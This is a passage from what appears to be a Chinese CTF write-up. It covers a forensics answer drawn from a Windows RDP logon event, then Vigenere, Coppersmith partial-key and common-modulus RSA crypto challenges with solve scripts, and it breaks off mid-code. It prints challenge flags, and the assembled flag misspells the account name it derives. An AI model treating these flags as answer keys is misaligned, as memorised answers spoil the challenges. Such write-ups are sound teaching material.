(加上用户域)</p>\n</blockquote>\n<p>需要在 windows 审计日志工具寻找</p>\n<p>需要事件 ID 为 4624</p>\n<blockquote>\n<p>使用者:<br>\n 安全 ID:\t\tSYSTEM<br>\n 帐户名:\t\tWIN-WH8G5MDPHE5$<br>\n 帐户域:\t\tADOFLMB<br>\n 登录 ID:\t\t0x3E7</p>\n<p>登录类型:\t\t\t10</p>\n<p 00000000-0000-0000-0000-000000000000=\"\">新登录:<br>\n 安全 ID:\t\tS-1-5-21-867333373-202576419-2389709931-1103<br>\n 帐户名:\t\tattack$<br>\n 帐户域:\t\tADOFLMB<br>\n 登录 ID:\t\t0x12A334<br>\n 登录 GUID:\t\t</p>\n<p>进程信息:<br>\n 进程 ID:\t\t0x974<br>\n 进程名:\t\tC:\\Windows\\System32\\winlogon.exe</p>\n<p>网络信息:<br>\n 工作站名:\tWIN-WH8G5MDPHE5<br>\n 源网络地址:\t192.168.222.200<br>\n 源端口:\t\t35186</p>\n<p>详细身份验证信息:<br>\n 登录进程:\t\tUser32<br>\n 身份验证数据包:\tNegotiate<br>\n 传递的服务:\t-<br>\n 数据包名 (仅限 NTLM):\t-<br>\n 密钥长度:\t\t0</p>\n<p>创建登录会话后，在被访问的计算机上生成此事件。</p>\n<p>“使用者” 字段指明本地系统上请求登录的帐户。这通常是一个服务 (例如 Server 服务) 或本地进程 (例如 Winlogon.exe 或 Services.exe)。</p>\n<p>“登录类型” 字段指明发生的登录种类。最常见的类型是 2 (交互式) 和 3 (网络)。</p>\n<p>“新登录” 字段指明新登录是为哪个帐户创建的，即登录的帐户。</p>\n<p>“网络” 字段指明远程登录请求来自哪里。“工作站名” 并非总是可用，而且在某些情况下可能会留为空白。</p>\n<p>模拟级别字段指明登录会话中的进程可以模拟的程度。</p>\n<p>“身份验证信息” 字段提供关于此特定登录请求的详细信息。<br>\n-“登录 GUID” 是可用于将此事件与 KDC 事件关联起来的唯一标识符。<br>\n-“传递的服务” 指明哪些中间服务参与了此登录请求。</p>\n<ul>\n<li>“数据包名” 指明在 NTLM 协议之间使用了哪些子协议。<br>\n-“密钥长度” 指明生成的会话密钥的长度。如果没有请求会话密钥，则此字段为 0。</li>\n</ul>\n</blockquote>\n<p>由此可见黑客远程登陆 RDP 的账户为 ADOFLMB\\attack$</p>\n<p>所以 flag 为 192.168.222.200|attack$|Administrators|callback|c:\\windows\\system32\\windows_attack.exe|ADOFLMB\\attact$</p>\n<h3 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> CRYPTO</h3>\n<h4 id=\"签到vigenere\"><a class=\"markdownIt-Anchor\" href=\"#签到vigenere\">#</a> [签到] Vigenere</h4>\n<blockquote>\n<p>最终分数 102 pts</p>\n</blockquote>\n<blockquote>\n<p>19 世纪末，无法破译的密码被应用于一场大规模内战，它在 20 世纪初期更是被认为是无法被转化的密码。后来，人们走到了 21 世纪，有着更高的算力，这种无法破译的密码也被高算力轻松攻破，你的任务便是使用你的高算力，跨越历史的长河，攻破这份密文！</p>\n</blockquote>\n<pre><code>Gn taj xirly gf Fxgjuakd, oe igywnd mt tegbs mnrxxlrivywd sngearbsw wakksre. Bs kpimj gf tank, it bx gur bslenmngn th jfdetagur mt ceei yze Ugnled Lystel tx Amxwaca gjmtrtq.\n\nAn taj wvegy gf tank nom xmccxjvinz, bw prhugse ts sllbffce hs lhe ytdlopnfg btxas wbyz Meqnuo: Tafl we lmsll ffce wtw logxyzer tsv madj heavj logxyzer. Pj khaeq yivLNUTF&#123;4695vft9-fd68-4684-uj81-u6c1avg6uaft&#125;j yenxwgus ynfanvnsl snuhorm, ffd ag zfdekxlanwnfg og tmr ptwl thty Eexbhg is mt jechsiuek yze lhxl tekwatokd an Nxb Eexbhg, Teqfk, anw Fjizhss. Thx iwtabqk of ljltlxrwnt tww leyy lo yhz.\n\nQou tww inlyjucmjv to bsxorf yze Pkjkidxsl [of Fjpich] tx thx ftovx nf thx ljeamjkt chsxidxsue al xgon tx at il hwrttnf thty lhekj oile gw an hzlbrxfc of pfj wimm lhe Nsatew Xlatxx snd lzygely lham yze Pkjkidxsl, on ank owg nfitbflivx, nfvimj Bapts lo ifrwdityw adajjenvj oita yzis iqsn; am yze strw tifj, gffxw lo mxiaatx gwtwxjf Jaiff anw tmrsxqnes.\n\nIqwasx hsll mt lhe tylenmngn oy yze Pkjkidxsl thty lhe kzlhlxxk emiqgymxsl of hzj suursrigjk nop txfekx lhe iwgspxhl of vtepeeqang Xsylagi lo mtpw pethw in t kww mhslhs.\n</code></pre>\n<p>网址 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ3ViYWxsYS5kZS92aWdlbmVyZS1zb2x2ZXI=\">Vigenere Solver | guballa.de</span></p>\n<h4 id=\"铜匠\"><a class=\"markdownIt-Anchor\" href=\"#铜匠\">#</a> 铜匠</h4>\n<blockquote>\n<p>最终分数 759 pts</p>\n</blockquote>\n<blockquote>\n<p>三年二班的皮郜伟同学，他的理想是做一名铜匠，为此他决定深入学习关于铜匠的知识</p>\n</blockquote>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> enc <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Decimal_conversion</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> num <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    digits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> num<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        digits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        num <span class=\"token operator\">//=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"leak = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>Decimal_conversion<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">112]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"e = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>leak = 2011133132443111302000224204142244403203442000141102312242343143241244243020003333022112141220422134444214010012</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>n = 85988668134257353631742597258304937106964673395852009846703777410474172989069717247424903079500594820235304351355706519069516847244761609583338251489134035212061654870087550317540291994559481862615812258493738064606592165529948648774081655902831715928483206013332330998262897765489820121129058926463847702821</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>e = 65537</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>c = 64708526479058278743788046708923650158905888858865427385501446781738669889375403360886995849554813207230509920789341593771929287415439407977283018525484281064769128358863513387658744063469874845446480637925790150835186431234289848506337341595817156444941964510251032210939739594241869190746437858135599624562</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>'''</span></pre></td></tr></table></figure><p>首先还原 p 高位</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Decimal_conversion</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> num <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    digits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">while</span> num<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        digits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        num <span class=\"token operator\">//=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\"># print(''.join(reversed(digits)))</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>leak <span class=\"token operator\">=</span> Decimal_conversion<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>leak1 <span class=\"token operator\">=</span> <span class=\"token string\">'2011133132443111302000224204142244403203442000141102312242343143241244243020003333022112141220422134444214010012'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decimal_conversion_back</span><span class=\"token punctuation\">(</span>num_in_base_5_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    num_in_base_10 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span> index<span class=\"token punctuation\">,</span> digit <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span>num_in_base_5_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        num_in_base_10 <span class=\"token operator\">+=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>digit<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token operator\">**</span> index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> num_in_base_10</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>decimal_conversion_back<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">112</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">109</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>decimal_conversion_back<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>leak1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">112</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">109</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#0xe0640a71f195151ec1ce19d2f279bdb781cd408c9c3e6cd98d52c685828cbf34|3dcf54f720d12f289219a8e129ad48ff74f5a6ffe3b9502a872bc176eb039c9a</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#0xe86194b49733b661b45654e0b6d7ec038e2815ce2b3ca16dcafda0b456f91e1e|752c3b385c8799bf36ebac684ae31c199eb59f6a4626ae786f811aa05d87a667</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#0xe0640a71f195151ec1ce19d2f279bdb781cd408c9c3e6cd98d52c685828cbf34|5f65ebf6b4b4d56880c2291ec13802ca68082513a08c63cd034f98a9d4f3261d</span></pre></td></tr></table></figure><p>取得 p 高位后 8bit 爆破即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">85988668134257353631742597258304937106964673395852009846703777410474172989069717247424903079500594820235304351355706519069516847244761609583338251489134035212061654870087550317540291994559481862615812258493738064606592165529948648774081655902831715928483206013332330998262897765489820121129058926463847702821</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p_high <span class=\"token operator\">=</span> <span class=\"token number\">0xe86194b49733b661b45654e0b6d7ec038e2815ce2b3ca16dcafda0b456f91e1e</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">64708526479058278743788046708923650158905888858865427385501446781738669889375403360886995849554813207230509920789341593771929287415439407977283018525484281064769128358863513387658744063469874845446480637925790150835186431234289848506337341595817156444941964510251032210939739594241869190746437858135599624562</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>pbits<span class=\"token operator\">=</span><span class=\"token number\">512</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> trange<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        p4 <span class=\"token operator\">=</span> p_high<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p4 <span class=\"token operator\">=</span> p4 <span class=\"token operator\">+</span> i</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        kbits <span class=\"token operator\">=</span> pbits <span class=\"token operator\">-</span> p4<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        p4 <span class=\"token operator\">=</span> p4 <span class=\"token operator\">&lt;&lt;</span> kbits</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        f <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> p4</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        roots <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>kbits<span class=\"token punctuation\">,</span> beta<span class=\"token operator\">=</span><span class=\"token number\">0.4</span><span class=\"token punctuation\">,</span> epsilon<span class=\"token operator\">=</span><span class=\"token number\">0.01</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> roots<span class=\"token punctuation\">:</span>        </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                p <span class=\"token operator\">=</span> p4<span class=\"token operator\">+</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">if</span> n<span class=\"token operator\">%</span>p<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                        <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>然后正常 rsa</p>\n<h4 id=\"superbrsa\"><a class=\"markdownIt-Anchor\" href=\"#superbrsa\">#</a> SuperbRSA</h4>\n<blockquote>\n<p>最终分数 239 pts</p>\n</blockquote>\n<blockquote>\n<p>CRYPTO 真的很难吗？Ö_O 不会吧不会吧！，一定要相信自己咩～</p>\n</blockquote>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#user:mumu666</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e1<span class=\"token operator\">=</span><span class=\"token number\">55</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e2<span class=\"token operator\">=</span><span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e1<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>c2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n=\"</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c1=\"</span><span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c2=\"</span><span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>c1<span class=\"token operator\">=</span> <span class=\"token number\">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>c2<span class=\"token operator\">=</span> <span class=\"token number\">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></pre></td></tr></table></figure><p>e1 e2 不互素</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> gcdext<span class=\"token punctuation\">,</span> iroot</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c1<span class=\"token operator\">=</span> <span class=\"token number\">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c2<span class=\"token operator\">=</span> <span class=\"token number\">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e1 <span class=\"token operator\">=</span> <span class=\"token number\">55</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e2 <span class=\"token operator\">=</span> <span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>g<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>y<span class=\"token operator\">=</span>gcdext<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span>e2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>m<span class=\"token operator\">=</span>iroot<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token 